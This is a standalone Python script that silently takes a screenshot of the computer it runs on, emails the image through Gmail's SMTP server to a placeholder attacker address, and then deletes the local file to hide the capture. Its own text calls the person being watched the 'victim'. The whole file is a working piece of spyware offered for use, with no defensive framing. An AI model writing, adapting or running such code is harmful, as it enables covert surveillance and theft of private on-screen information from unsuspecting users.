# Libraries
import smtplib, ssl
import pyautogui
import socket
import time
import imghdr
import os

from email.mime.text import MIMEText
from email.utils import formataddr

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# the screenshot part
name = socket.gethostname()
time = time.strftime("%H-%M-%S")
a = name + time
myScreenshot = pyautogui.screenshot()
myScreenshot.save(r'PATH_TO_DIRECTORY\emails\SS-'+a+'.png')

# the email part
sender_email = 'SENDER_EMAIL'
reciever_email = 'RECIEVER_EMAIL'
password = 'EMAIL_PASSWORD'
subject = 'This email conatins Screenshot from Victims user because specific keyword was detected!'

msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = reciever_email
msg['Subject'] = subject

email_body = 'This email was sent because someone ran the script somewhere and the script caught the Screenshot was send!'
msg.attach(MIMEText(email_body, 'plain'))

filename = 'SS-'+a+'.png'         #storing the file to be sent
attachment = open(filename, 'rb') #opening and reading the file to be sent as attachment

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= " +filename)

msg.attach(part)       #attaching the Screenshot as attachment
text = msg.as_string() #converting the text as string before sending

print('Sending the email...')

try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    context = ssl.create_default_context()
    server.starttls(context=context)
    server.login(sender_email, password)
    server.sendmail(sender_email, reciever_email, text)
    print('Email sent')
except Exception as e:
        print(f'Oh no! Something bad happenedf!\n{e}')
finally:
    print('Closing the server...')
    server.quit()   #quitting the server after sending image
    
# closing the opened file
attachment.close()

# removing the Screenshot from User's System
os.remove(r'PATH_TO_DIRECTORY\emails\SS-'+a+'.png')
